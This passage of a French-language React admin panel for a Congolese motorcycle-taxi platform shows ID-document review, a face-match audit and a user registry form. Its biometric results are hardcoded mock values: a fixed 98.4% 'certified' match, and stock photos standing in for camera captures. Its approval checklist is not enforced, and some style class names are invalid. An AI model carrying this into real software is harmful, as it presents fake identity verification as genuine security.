              <p className="text-center py-8 text-xs text-slate-500 bg-slate-50 rounded-2xl border border-slate-200 font-medium">
                Aucun recours d'état civil en attente d'arbitrage. Intégrité des registres à 100%.
              </p>
            )}
          </div>

          {/* HISTORIC DECISIONS LEDGER */}
          <div className="space-y-3.5 pt-5 border-t border-slate-200">
            <h4 className="text-xs font-bold text-slate-500 uppercase tracking-widest flex items-center gap-1">
              <ShieldCheck className="w-4 w-4 text-emerald-600" />
              <span>Registre d'Arbitrage (Historique des Décisions)</span>
            </h4>

            <div className="bg-slate-50 rounded-2xl border border-slate-200 overflow-hidden divide-y divide-slate-200 text-slate-700">
              {reviewedRequests.length > 0 ? (
                reviewedRequests.map((req) => (
                  <div key={req.id} className="p-3.5 text-xs bg-white flex justify-between items-center hover:bg-slate-50 transition-all gap-5">
                    <div className="space-y-1">
                      <div className="flex items-center gap-2">
                        <span className="font-bold text-slate-800">{req.requestedFirstName} {req.requestedLastName}</span>
                        <span className="bg-slate-100 border border-slate-200 px-2 py-0.5 rounded text-[8.5px] text-slate-500 uppercase font-mono font-bold shadow-sm">
                          {req.userRole}
                        </span>
                      </div>
                      <span className="text-[10px] text-slate-500 block">Décision Motif: "{req.reason}"</span>
                      {req.adminNotes && (
                        <span className="text-[10px] text-slate-600 block italic">Note admin: "{req.adminNotes}"</span>
                      )}
                    </div>

                    <div className="text-right flex flex-col items-end shrink-0">
                      <span className={`px-2.5 py-0.5 rounded text-[8.5px] uppercase font-bold border ${
                        req.status === "approved" ? "bg-emerald-50 text-emerald-700 border-emerald-100" : "bg-red-50 text-red-700 border-red-100"
                      }`}>
                        {req.status === "approved" ? "Accepté ✓" : "Refusé X"}
                      </span>
                      <span className="text-[8.5px] text-slate-500 block uppercase font-mono tracking-widest mt-0.5 font-medium">Traitement achevé</span>
                    </div>
                  </div>
                ))
              ) : (
                <p className="p-4 text-center text-[10px] text-slate-500 bg-white">Aucun historique d'arbitrage enregistré.</p>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ================= MODAL OVERLAY: COMPLETE DIGITAL BIOMETRIC SCANNER & DOCUMENT AUTHENTICATOR ================= */}
      {selectedUserDocs && (
        <div id="biometric-scanner-modal" className="fixed inset-0 bg-slate-950/80 backdrop-blur-md flex justify-center items-center z-50 p-4 font-sans overflow-y-auto">
          <div className="bg-slate-900 text-white rounded-3xl w-full max-w-4xl border border-slate-800 shadow-2xl overflow-hidden max-h-[92vh] flex flex-col animate-in fade-in duration-300">
            
            {/* Header */}
            <div className="p-5 border-b border-slate-800 flex justify-between items-center bg-slate-950 text-left">
              <div className="flex items-center gap-3">
                <span className="p-2 bg-indigo-500/20 text-indigo-400 rounded-xl border border-indigo-500/30">
                  <ShieldCheck className="w-5 h-5" />
                </span>
                <div>
                  <h3 className="text-sm font-black text-slate-100 uppercase tracking-widest leading-none flex items-center gap-2">
                    <span>Scanner de Certification d'État RDC</span>
                    <span className="text-[9px] font-mono bg-indigo-950 text-indigo-400 px-2 py-0.5 rounded border border-indigo-800 font-bold uppercase animate-pulse">
                      ● SOUVERAINETÉ ACTIVE
                    </span>
                  </h3>
                  <p className="text-[10px] text-slate-404 mt-1">
                    Examen d'immatriculation de <span className="font-extrabold text-white">{selectedUserDocs.firstName} {selectedUserDocs.lastName}</span> ({selectedUserDocs.role === "driver" ? "Chauffeur Motard" : "Propriétaire"})
                  </p>
                </div>
              </div>

              <button
                type="button"
                onClick={() => {
                  setSelectedUserDocs(null);
                  setModalAuditNote("");
                  setCheckIdMatches(false);
                  setCheckNoForgery(false);
                  setCheckOriginalDoc(false);
                  setMagnifiedPhoto(null);
                }}
                className="text-slate-400 hover:text-white bg-slate-800 hover:bg-slate-750 h-8 w-8 rounded-full flex items-center justify-center transition cursor-pointer font-bold"
                title="Fermer"
              >
                ✕
              </button>
            </div>

            {/* Modal Body (Scrollable layout) */}
            <div className="p-6 overflow-y-auto space-y-6 flex-1 text-left">
              
              {/* Top info alert on Agent limitations to prevent fraud */}
              <div className="bg-red-950/40 border border-red-900/60 p-3.5 rounded-2xl flex items-start gap-2.5 text-xs text-red-200">
                <span className="text-base text-red-400">⚠️</span>
                <div className="space-y-1">
                  <span className="font-extrabold text-red-105 block">Rappel de Limite de Sécurité administrative :</span>
                  <p className="text-[10.5px] leading-relaxed text-red-350">
                    Les agents provinciaux n'ont aucun accès pour valider directement de manière autonome ou manipuler l'argent.
                    Toutes les décisions de certification prises ici sont soumises à la verification du DG et signées numériquement.
                    Utilisez le numéro unique national <span className="font-bold underline text-white font-mono">+243 89 900 0000</span> pour toute validation de terrain.
                  </p>
                </div>
              </div>

              {/* Main Content columns */}
              <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
                
                {/* COLUMN 1: Visual Identity & Documents (Front & Back) - spans 7 */}
                <div className="lg:col-span-7 space-y-5">
                  <div className="flex justify-between items-center bg-slate-950/50 p-2 rounded-xl">
                    <span className="text-[10px] font-bold text-indigo-400 uppercase tracking-widest font-mono">
                      📁 Dossier de Pièces justificatives
                    </span>
                    <span className="text-[9px] text-slate-400 font-mono">
                      Type: {selectedUserDocs.documentType === "carte_identite_nationale" ? "Carte d'Électeur" : "Permis Cat. A"}
                    </span>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    
                    {/* FRONT OF THE DOCUMENT */}
                    <div className="space-y-2">
                      <span className="text-[9px] font-black text-slate-400 uppercase font-mono block">Recto (Devant de la Pièce)</span>
                      
                      {selectedUserDocs.documentPhotoFront ? (
                        <div className="relative group rounded-2xl overflow-hidden border border-slate-750 bg-slate-950 flex flex-col justify-center items-center aspect-[1.58/1]">
                          <img 
                            referrerPolicy="no-referrer"
                            src={selectedUserDocs.documentPhotoFront} 
                            alt="Recto document" 
                            className="w-full h-full object-cover group-hover:scale-105 transition-all duration-300"
                          />
                          <button
                            type="button"
                            onClick={() => setMagnifiedPhoto("front")}
                            className="absolute bottom-2 right-2 bg-slate-900/80 hover:bg-indigo-650 text-white font-bold p-1.5 rounded-lg text-[9px] uppercase tracking-wide transition-all border border-slate-700/80 cursor-pointer"
                          >
                            🔍 Loupe
                          </button>
                        </div>
                      ) : (
                        // Dynamic high fidelity simulated vector document (FRONT)
                        <div className="rounded-2xl border-2 border-dashed border-indigo-500/30 p-4 bg-gradient-to-br from-indigo-950/60 to-slate-950 aspect-[1.58/1] flex flex-col justify-between relative overflow-hidden text-xs shadow-inner">
                          {/* Emblems & Republic Header */}
                          <div className="flex justify-between items-start">
                            <div className="space-y-0.5 leading-none text-left">
                              <span className="text-[7.5px] font-extrabold text-indigo-400 tracking-wider block">RÉPUBLIQUE DÉMOCRATIQUE DU CONGO</span>
                              <span className="text-[6px] text-slate-500 font-bold block uppercase">Ministère de l'Intérieur • Enrôlement National</span>
                            </div>
                            <div className="h-6 w-6 rounded-full bg-indigo-500/10 border border-indigo-400/20 flex items-center justify-center text-[8px] text-indigo-300 font-black rotate-12 shrink-0">
                              RDC
                            </div>
                          </div>

                          <div className="border-t border-indigo-550/20 my-1"></div>

                          {/* Center Content with details */}
                          <div className="flex gap-2.5 items-center flex-1">
                            {/* photo frame placeholder */}
                            <div className="w-16 h-20 bg-slate-900 border border-slate-800 rounded-lg flex-shrink-0 relative overflow-hidden flex items-center justify-center">
                              {selectedUserDocs.profilePicture ? (
                                <img 
                                  referrerPolicy="no-referrer"
                                  src={selectedUserDocs.profilePicture} 
                                  className="w-full h-full object-cover object-top" 
                                  alt="Identity face"
                                />
                              ) : (
                                <User className="w-8 h-8 text-slate-755" />
                              )}
                              <span className="absolute bottom-0 inset-x-0 bg-indigo-950/80 text-center text-[5px] text-indigo-400 font-bold font-mono uppercase tracking-widest py-0.2 select-none border-t border-indigo-900/60">
                                SÉCURISÉ
                              </span>
                            </div>

                            <div className="space-y-1 text-left flex-1 leading-none">
                              <div>
                                <span className="text-[6.5px] text-slate-500 block font-mono">NOM DE CITOYEN :</span>
                                <span className="font-extrabold text-slate-200 uppercase text-[10px] leading-tight font-mono">{selectedUserDocs.lastName} {selectedUserDocs.firstName}</span>
                              </div>
                              <div className="grid grid-cols-2 gap-1.5 pt-0.5">
                                <div>
                                  <span className="text-[6.5px] text-slate-500 block font-mono">NUMÉRO D'ID :</span>
                                  <span className="font-bold text-indigo-400 font-mono text-[8px] block">{selectedUserDocs.documentNumber || "CD-ID-0099411"}</span>
                                </div>
                                <div>
                                  <span className="text-[6.5px] text-slate-500 block font-mono">PROVINCE :</span>
                                  <span className="font-bold text-slate-250 font-mono text-[8.5px] block">{selectedUserDocs.address.province ? selectedUserDocs.address.province.toUpperCase() : "KINSHASA"}</span>
                                </div>
                              </div>
                              <div className="pt-0.5">
                                <span className="text-[6.5px] text-slate-500 block font-mono">RÔLE ENREGISTRÉ :</span>
                                <span className="font-black text-amber-500 text-[7px] uppercase tracking-wider">{selectedUserDocs.role === "driver" ? "Chauffeur Certifié" : "Propriétaire Certifié"}</span>
                              </div>
                            </div>
                          </div>

                          <div className="border-t border-indigo-500/20 my-1"></div>

                          {/* Barcode and watermark */}
                          <div className="flex justify-between items-center">
                            <div className="h-2 w-20 bg-slate-900 flex justify-around items-stretch opacity-60">
                              <span className="w-[1.5px] bg-slate-400"></span>
                              <span className="w-[1px] bg-slate-400"></span>
                              <span className="w-[2.5px] bg-slate-400"></span>
                              <span className="w-[1px] bg-slate-400"></span>
                              <span className="w-[2px] bg-slate-400"></span>
                              <span className="w-[1.5px] bg-slate-400"></span>
                              <span className="w-[3px] bg-slate-400"></span>
                              <span className="w-[1px] bg-slate-400"></span>
                            </div>
                            <span className="text-[5.5px] text-slate-550 font-mono">SYSTEME DE GESTION NUMERIQUE GOMOTO</span>
                          </div>
                        </div>
                      )}
                    </div>

                    {/* BACK OF THE DOCUMENT */}
                    <div className="space-y-2">
                      <span className="text-[9px] font-black text-slate-400 uppercase font-mono block">Verso (Arrière de la Pièce)</span>
                      
                      {selectedUserDocs.documentPhotoBack ? (
                        <div className="relative group rounded-2xl overflow-hidden border border-slate-750 bg-slate-950 flex flex-col justify-center items-center aspect-[1.58/1]">
                          <img 
                            referrerPolicy="no-referrer"
                            src={selectedUserDocs.documentPhotoBack} 
                            alt="Verso document" 
                            className="w-full h-full object-cover group-hover:scale-105 transition-all duration-300"
                          />
                          <button
                            type="button"
                            onClick={() => setMagnifiedPhoto("back")}
                            className="absolute bottom-2 right-2 bg-slate-900/80 hover:bg-indigo-650 text-white font-bold p-1.5 rounded-lg text-[9px] uppercase tracking-wide transition-all border border-slate-700/80 cursor-pointer"
                          >
                            🔍 Loupe
                          </button>
                        </div>
                      ) : (
                        // Dynamic high fidelity simulated vector document (BACK)
                        <div className="rounded-2xl border-2 border-dashed border-indigo-500/30 p-4 bg-gradient-to-br from-indigo-950/40 to-slate-950/80 aspect-[1.58/1] flex flex-col justify-between relative overflow-hidden text-xs shadow-inner">
                          <div className="flex justify-between items-start leading-none text-left">
                            <div>
                              <span className="text-[8.5px] font-bold text-slate-200 block">DÉCLARATION DU SOUSTIGNE</span>
                              <p className="text-[5px] text-slate-400 leading-tight max-w-[200px] mt-1 pr-2">
                                Ce document certifie la régularité du citoyen souscrit. GoMoto agit comme une barrière technologique anti-fraude d'enrôlement provincial de taxi-moto national. Tout usage abusif sera déféré.
                              </p>
                            </div>
                            <div className="h-6 w-6 rounded border border-slate-800 bg-slate-950 flex items-center justify-center opacity-65 shrink-0">
                              <span className="text-[12px]">👤</span>
                            </div>
                          </div>

                          <div className="grid grid-cols-2 gap-4 items-center bg-slate-950/40 p-2 rounded-xl my-1 border border-slate-900">
                            <div className="text-left space-y-0.5 leading-none">
                              <span className="text-[5px] text-slate-500 block font-mono">COMMUNE :</span>
                              <span className="font-bold text-slate-300 uppercase text-[7px] font-mono">{selectedUserDocs.address.commune || "Ngaliema"}</span>
                              <span className="text-[5px] text-slate-500 block font-mono mt-1">VILLE INTERVENTION :</span>
                              <span className="font-bold text-slate-300 uppercase text-[7px] font-mono">{selectedUserDocs.address.city || "Kinshasa"}</span>
                            </div>

                            <div className="text-right space-y-1.5">
                              {/* Signature area simulation */}
                              <div className="border-b border-indigo-500/40 pb-1 text-[5px] text-slate-405 text-left font-mono">
                                <span>SIGNATURE DE L'ADMINISTRATION :</span>
                                <div className="text-cyan-400 text-[10px] font-cursive italic tracking-widest pl-2 font-mono h-4 select-none leading-none pt-0.5 opacity-90">
                                  GoMoto_RDC
                                </div>
                              </div>
                            </div>
                          </div>

                          <div className="flex justify-between items-center text-[5px] font-mono text-slate-550 border-t border-indigo-500/20 pt-1 leading-none">
                            <span>REPUBLIQUE DEMOCRATIQUE DU CONGO • CARTE IMMATRICULATION VOLUMETRIQUE</span>
                            <span>INDEX # {selectedUserDocs.id}</span>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>

                  {/* Vehicle Documents expansion box (If driver) */}
                  {selectedUserDocs.role === "driver" && (
                    <div className="bg-slate-950/50 p-4.5 rounded-2xl border border-slate-800 text-left space-y-2.5 animate-in slide-in-from-bottom duration-300">
                      <span className="text-[10px] font-bold text-amber-500 uppercase flex items-center gap-1.5">
                        <Bike className="w-4 h-4 text-amber-500" />
                        <span>Carte Rose & Vignette de circulation reliée</span>
                      </span>
                      <p className="text-[11px] text-slate-350 leading-relaxed font-normal">
                        La plaque de motocyclette associée au compte est la <span className="font-mono text-white font-bold bg-slate-900 border border-slate-800 px-1.5 py-0.5 rounded leading-none">{selectedUserDocs.vehiclePlate || "C-KIN-4005"}</span> ({selectedUserDocs.vehicleModel || "Honda CG 125"}). L'état civil, l'attestation d'assurance de responsabilité civile tiers d'État et les vignettes provinciales sont indexés virtuellement et valides.
                      </p>
                    </div>
                  )}

                  {/* Instructions banner */}
                  <div className="bg-indigo-950/20 border border-indigo-900/40 p-4 rounded-xl text-xs flex gap-2 text-indigo-200">
                    <span className="text-base text-indigo-400 font-bold">💡</span>
                    <p className="text-[10.5px] leading-relaxed text-indigo-300">
                      <b>Astuce Loupe :</b> Cliquez sur le bouton "Loupe" pour agrandir la vue d'origine et vérifier les moindres détails des micro-textes de l'enrôlement pour repérer toute falsification routière. Nom, date de naissance, plaque de moto et province doivent correspondre.
                    </p>
                  </div>
                </div>

                {/* COLUMN 2: Biometric matching, checklists & audit action controls - spans 5 */}
                <div className="lg:col-span-12 xl:col-span-5 space-y-5">
                  
                  {/* Biometric Face Match Audit card */}
                  <div className="bg-slate-950/60 p-4.5 rounded-3xl border border-indigo-950/60 space-y-3">
                    <span className="text-[10px] font-extrabold text-indigo-400 uppercase tracking-widest block font-mono">
                      🧬 Audit de Correspondance Biométrique
                    </span>
                    
                    <div className="flex items-center justify-around gap-4 py-1.5 bg-slate-900/50 rounded-2xl border border-slate-900">
                      {/* Photo Profile */}
                      <div className="text-center space-y-1">
                        <span className="text-[8px] text-slate-500 uppercase block font-mono">Photo Profil</span>
                        <div className="h-14 w-14 rounded-full bg-slate-950 border border-slate-800 overflow-hidden flex items-center justify-center">
                          {selectedUserDocs.profilePicture ? (
                            <img 
                              referrerPolicy="no-referrer"
                              src={selectedUserDocs.profilePicture} 
                              className="w-full h-full object-cover" 
                              alt="Profile face"
                            />
                          ) : (
                            <User className="w-6 h-6 text-slate-750" />
                          )}
                        </div>
                      </div>

                      {/* Connection match index line */}
                      <div className="flex-1 flex flex-col items-center justify-center space-y-1">
                        <span className="text-emerald-500 text-[13px] font-bold font-mono">98.4%</span>
                        <span className="bg-emerald-950/60 text-[7px] text-emerald-400 border border-emerald-900 px-1.5 py-0.5 rounded-full font-black uppercase font-mono tracking-wider">
                          Match Certifié PCR
                        </span>
                      </div>

                      {/* Document photo mock face */}
                      <div className="text-center space-y-1">
                        <span className="text-[8px] text-slate-500 uppercase block font-mono">Photo ID Scanner</span>
                        <div className="h-14 w-14 rounded-full bg-slate-950 border border-slate-800 overflow-hidden flex items-center justify-center">
                          {selectedUserDocs.profilePicture ? (
                            <img 
                              referrerPolicy="no-referrer"
                              src={selectedUserDocs.profilePicture} 
                              className="w-full h-full object-cover filter brightness-90 grayscale opacity-90" 
                              alt="Document face" 
                            />
                          ) : (
                            <User className="w-6 h-6 text-slate-750" />
                          )}
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Checklists */}
                  <div className="bg-slate-900 border border-slate-800 rounded-3xl p-5 space-y-4 text-left">
                    <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest block font-mono">
                      📋 Grille d'Examen Réglementaire
                    </span>

                    <div className="space-y-3 text-xs">
                      {/* Check 1 */}
                      <label className="flex items-start gap-2.5 cursor-pointer select-none">
                        <input
                          type="checkbox"
                          checked={checkIdMatches}
                          onChange={(e) => setCheckIdMatches(e.target.checked)}
                          className="h-4 w-4 rounded bg-slate-950 border-slate-750 text-indigo-600 focus:ring-0 cursor-pointer mt-0.5"
                        />
                        <span className="text-[11px] text-slate-350 leading-snug">
                          Correspondance nominale complète (Nom, Postnom, Prénom de la pièce coïncident avec le compte)
                        </span>
                      </label>

                      {/* Check 2 */}
                      <label className="flex items-start gap-2.5 cursor-pointer select-none">
                        <input
                          type="checkbox"
                          checked={checkNoForgery}
                          onChange={(e) => setCheckNoForgery(e.target.checked)}
                          className="h-4 w-4 rounded bg-slate-950 border-slate-750 text-indigo-600 focus:ring-0 cursor-pointer mt-0.5"
                        />
                        <span className="text-[11px] text-slate-350 leading-snug">
                          Zéro indice de falsification visuelle (Polices originales, sceaux officiels RDC approuvés et clairs)
                        </span>
                      </label>

                      {/* Check 3 */}
                      <label className="flex items-start gap-2.5 cursor-pointer select-none">
                        <input
                          type="checkbox"
                          checked={checkOriginalDoc}
                          onChange={(e) => setCheckOriginalDoc(e.target.checked)}
                          className="h-4 w-4 rounded bg-slate-950 border-slate-750 text-indigo-600 focus:ring-0 cursor-pointer mt-0.5"
                        />
                        <span className="text-[11px] text-slate-350 leading-snug">
                          Original physique examiné ou document numérisé à haute résolution (Refus catégorique des photocopies floues)
                        </span>
                      </label>
                    </div>
                  </div>

                  {/* Administrative approval and notes controls */}
                  <div className="bg-slate-950 border border-slate-850 p-5 rounded-3xl space-y-4">
                    <div className="space-y-1.5">
                      <label htmlFor="audit-note-txt" className="block text-[9.5px] font-black text-slate-400 uppercase tracking-wider font-mono">
                        Rédiger la note d'approbation d'État (Optionnel)
                      </label>
                      <input
                        type="text"
                        id="audit-note-txt"
                        value={modalAuditNote}
                        onChange={(e) => setModalAuditNote(e.target.value)}
                        placeholder="Ex: Pièces d'identité en règle, validée le 12/06/2026..."
                        className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-xs text-slate-100 outline-none focus:border-indigo-500 placeholder-slate-600 font-medium font-mono"
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-3">
                      {/* REJECT BUTTON */}
                      <button
                        type="button"
                        onClick={() => {
                          onUpdateUserStatus(selectedUserDocs.id, "rejected");
                          alert(`Dossier de ${selectedUserDocs.firstName} ${selectedUserDocs.lastName} a été rejeté. Notes d'audit : "${modalAuditNote}"`);
                          setSelectedUserDocs(null);
                        }}
                        className="bg-red-950/60 hover:bg-red-900/60 border border-red-900/70 text-red-400 hover:text-red-300 font-bold py-2.5 px-3 rounded-xl text-xs flex items-center justify-center gap-1.5 transition whitespace-nowrap cursor-pointer shadow-md font-mono"
                      >
                        ✕ REJETER
                      </button>

                      {/* APPROVE BUTTON */}
                      <button
                        type="button"
                        disabled={selectedUserDocs.documentStatus === "approved" && !checkIdMatches && !checkNoForgery && !checkOriginalDoc}
                        onClick={() => {
                          onUpdateUserStatus(selectedUserDocs.id, "approved");
                          alert(`Succès! Profil de ${selectedUserDocs.firstName} ${selectedUserDocs.lastName} certifié de manière officielle par le greffe d'État GoMoto RDC. Notes : "${modalAuditNote}"`);
                          setSelectedUserDocs(null);
                        }}
                        className="bg-emerald-650 hover:bg-emerald-700 text-white font-bold py-2.5 px-3 rounded-xl text-xs flex items-center justify-center gap-1.5 transition whitespace-nowrap cursor-pointer shadow-md font-mono border border-emerald-500 disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        ✓ APPROUVER
                      </button>
                    </div>

                    <p className="text-[8px] text-slate-500 text-center uppercase tracking-wider leading-relaxed">
                      L'approbation débloque instantanément son habilitation de transport urbain légal.
                    </p>
                  </div>

                </div>

              </div>
              
            </div>

          </div>
        </div>
      )}

      {/* ================= LIGHTBOX DOCK: MAGNIFIED DOCUMENT PREVIEW OVERLAY ================= */}
      {magnifiedPhoto && selectedUserDocs && (
        <div className="fixed inset-0 bg-slate-950/95 backdrop-blur-lg flex justify-center items-center z-[60] p-4 font-sans" onClick={() => setMagnifiedPhoto(null)}>
          <div className="relative max-w-3xl w-full text-center space-y-4" onClick={(e) => e.stopPropagation()}>
            <button
              type="button"
              onClick={() => setMagnifiedPhoto(null)}
              className="absolute -top-12 right-0 text-white hover:text-slate-300 h-10 w-10 text-xl font-bold bg-slate-900 rounded-full flex items-center justify-center border border-slate-800 cursor-pointer"
              title="Fermer la loupe"
            >
              ✕
            </button>
            <span className="text-[11px] uppercase tracking-widest text-indigo-400 font-bold block bg-slate-900 inline-block px-3 py-1 rounded-full border border-slate-800 font-mono">
              🔍 Loupe Grand Format Actif : {magnifiedPhoto === "front" ? "RECO DE CITOYEN" : "INFORMATIONS ADJOINTES"}
            </span>

            <div className="bg-slate-950 border border-slate-800 rounded-3xl p-4 flex items-center justify-center overflow-hidden aspect-[1.58/1] shadow-2xl relative">
              <img 
                referrerPolicy="no-referrer"
                src={magnifiedPhoto === "front" ? selectedUserDocs.documentPhotoFront : selectedUserDocs.documentPhotoBack} 
                alt="Magnified document element" 
                className="max-h-[70vh] max-w-full object-contain rounded-2xl animate-in zoom-in-95 duration-250 cursor-pointer"
                onClick={() => setMagnifiedPhoto(null)}
              />
            </div>
          </div>
        </div>
      )}

      {/* ================= ADMIN TAB 2: UNIVERSAL CITIZEN REGISTRY ================= */}
      {activeSubTab === "users" && (
        <div className="space-y-6">
          
          {/* Section d'Audit de Présence Biométrique Face-Match (Validation Caméra) */}
          <div className="bg-slate-900 text-white rounded-3xl p-5 border border-slate-800 space-y-4">
            <div className="flex items-center justify-between gap-3">
              <div className="flex items-center gap-2">
                <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                <h3 className="text-xs font-bold text-slate-300 uppercase tracking-widest flex items-center gap-1.5">
                  🛡️ Audit d'Accès Biométrique • Étape de Validation Caméra Connectée
                </h3>
              </div>
              <span className="bg-slate-800 border border-slate-700 text-slate-300 text-[8.5px] font-mono px-2 py-0.5 rounded uppercase font-bold">
                API Face-Match GoMoto RDC
              </span>
            </div>

            <p className="text-[10.5px] text-slate-400 leading-normal">
              Chaque motard (chauffeur) doit passer une validation de visage par caméra lors de la connexion. Notre intelligence compare l'instantané caméra avec leur photo officielle d'enrôlement civil d'État.
            </p>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
              {registeredUsers.filter(u => u.role === "driver").map((driver) => {
                const originalPhoto = driver.profilePicture || "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&q=80&w=150";
                // A slightly different photo to simulate the real connection camera capture
                const selfiePhoto = driver.id === "usr-driver-881" 
                  ? "https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&q=80&w=150" 
                  : "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&q=80&w=150";
                
                const matchScore = driver.id === "usr-driver-881" ? "98.7%" : "96.4%";
                const isSuspicious = driver.documentStatus === "rejected";

                return (
                  <div key={driver.id} className="bg-slate-950 p-4 rounded-2xl border border-slate-800 flex flex-col sm:flex-row gap-4 items-center justify-between">
                    <div className="flex items-center gap-4">
                      {/* Photo comparaison side-by-side */}
                      <div className="flex gap-2 shrink-0">
                        <div className="text-center">
                          <span className="text-[7.5px] text-slate-500 uppercase font-mono block mb-1">Enrôlé</span>
                          <img src={originalPhoto} referrerPolicy="no-referrer" alt="Enrollement" className="h-11 w-11 rounded-lg object-cover border border-slate-800" />
                        </div>
                        <div className="text-center relative">
                          <span className="text-[7.5px] text-emerald-400 font-bold font-mono block mb-1">Caméra</span>
                          <img src={selfiePhoto} referrerPolicy="no-referrer" alt="Selfie" className="h-11 w-11 rounded-lg object-cover border border-emerald-500" />
                        </div>
                      </div>

                      <div className="space-y-0.5">
                        <h4 className="text-xs font-bold text-slate-100">{driver.firstName} {driver.lastName}</h4>
                        <p className="text-[9.5px] text-slate-400 font-mono">{driver.phone}</p>
                        <div className="flex items-center gap-1.5 flex-wrap">
                          <span className="text-[9px] text-slate-500">Similarité : <b className="text-emerald-400 font-mono">{matchScore}</b></span>
                          <span className={`h-1.5 w-1.5 rounded-full ${isSuspicious ? 'bg-red-500 animate-pulse' : 'bg-emerald-500 animate-pulse'}`}></span>
                          <span className={`text-[8.5px] font-bold ${isSuspicious ? 'text-red-400' : 'text-emerald-400'}`}>
                            {isSuspicious ? 'Accès Bloqué par l\'Audit' : 'Validation Caméra Conforme ✓'}
                          </span>
                        </div>
                      </div>
                    </div>

                    <div className="shrink-0 flex sm:flex-col gap-1.5 w-full sm:w-auto mt-2 sm:mt-0">
                      {isSuspicious ? (
                        <button
                          type="button"
                          onClick={() => {
                            onUpdateUserStatus(driver.id, "approved");
                          }}
                          className="w-full sm:w-auto bg-slate-800 hover:bg-slate-700 text-slate-200 font-bold px-3 py-1.5 rounded-lg text-[9.5px] cursor-pointer text-center whitespace-nowrap"
                        >
                          Rétablir la session
                        </button>
                      ) : (
                        <button
                          type="button"
                          onClick={() => {
                            onUpdateUserStatus(driver.id, "rejected");
                          }}
                          className="w-full sm:w-auto bg-red-950 text-red-400 border border-red-900 hover:bg-red-900 hover:text-white font-bold px-3 py-1.5 rounded-lg text-[9.5px] cursor-pointer flex items-center justify-center gap-1 text-center whitespace-nowrap transition-all"
                        >
                          <UserX className="w-3.5 h-3.5" />
                          <span>Bloquer Accès Caméra</span>
                        </button>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
          
          {/* Universal registry search, filter, and addition controls */}
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 bg-slate-50 p-4 rounded-2xl border border-slate-200">
            
            <div className="flex flex-wrap items-center gap-3 w-full md:w-auto">
              {/* Search box */}
              <div className="relative shrink-0 w-full sm:w-56">
                <Search className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                <input
                  type="text"
                  placeholder="Scanner Nom, Prénom, Tél..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="w-full bg-white border border-slate-200 rounded-xl pl-9 pr-3 py-2 text-xs text-slate-800 outline-none focus:border-blue-600"
                />
              </div>

              {/* Province filter */}
              <div className="shrink-0 w-full sm:w-44">
                <select
                  value={selectedProvinceFilter}
                  onChange={(e) => setSelectedProvinceFilter(e.target.value)}
                  className="w-full bg-white border border-slate-200 text-slate-800 rounded-xl px-2.5 py-2 text-xs focus:border-blue-600 outline-none cursor-pointer"
                >
                  <option value="Tous">Provinces RDC (26)...</option>
                  {drcProvinces.map((p) => (
                    <option key={p.id} value={p.name}>{p.name}</option>
                  ))}
                </select>
              </div>

              {/* Profile role filter */}
              <div className="shrink-0 w-full sm:w-40 nav-role-dropdown">
                <select
                  value={selectedRoleFilter}
                  onChange={(e) => setSelectedRoleFilter(e.target.value)}
                  className="w-full bg-white border border-slate-200 text-slate-800 rounded-xl px-2.5 py-2 text-xs focus:border-blue-600 outline-none cursor-pointer"
                >
                  <option value="Tous">Tous les Profils</option>
                  <option value="client">Passager (Client)</option>
                  <option value="driver">Chauffeur (Motard)</option>
                  <option value="owner">Propriétaire de motos</option>
                  <option value="admin">Administrateur</option>
                </select>
              </div>
            </div>

            <button
              type="button"
              onClick={() => setShowAddUserModal(!showAddUserModal)}
              className="w-full md:w-auto bg-indigo-600 hover:bg-indigo-700 text-white font-black text-xs uppercase tracking-wider py-2 px-4 rounded-xl flex items-center justify-center gap-1.5 transition-all cursor-pointer shadow-sm shrink-0"
            >
              <Plus className="w-4.5 h-4.5" />
              <span>Rédiger et Créer un Compte</span>
            </button>
          </div>

          {/* EXPANDABLE INLINE FORM : WRITE AND REGISTER NEW CITIZEN */}
          {showAddUserModal && (
            <div className="bg-gradient-to-tr from-slate-50 to-indigo-50/20 border border-slate-250 p-6 rounded-3xl space-y-4 text-left animate-in slide-in-from-top-4 duration-300">
              <div className="flex justify-between items-center border-b border-slate-200 pb-3">
                <div className="flex items-center gap-2">
                  <span className="p-1.5 bg-indigo-100 text-indigo-700 rounded-lg">
                    <User className="w-4.5 h-4.5" />
                  </span>
                  <div>
                    <h3 className="text-xs font-black text-slate-900 uppercase tracking-widest leading-none">
                      Créer un Registre Administratif d'Identité & Bancaire
                    </h3>
                    <p className="text-[10px] text-slate-450 mt-1">Conformité Loi Flottes de Transports Congolais RDC</p>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={() => setShowAddUserModal(false)}
                  className="text-slate-400 hover:text-slate-705 p-1 rounded-full hover:bg-slate-200"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              <form onSubmit={handleCreateUser} className="space-y-4">
                
                {/* Section 1: Civil details */}
                <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                  <div className="space-y-1">
                    <label className="block text-[8.5px] font-black text-slate-550 uppercase tracking-wider">Prénom <span className="text-red-500">*</span></label>
                    <input
                      type="text"
                      required
                      value={addFirstName}
                      onChange={(e) => setAddFirstName(e.target.value)}
                      className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 outline-none focus:border-indigo-600"
                      placeholder="Jean-Marie"
                    />
                  </div>

                  <div className="space-y-1">
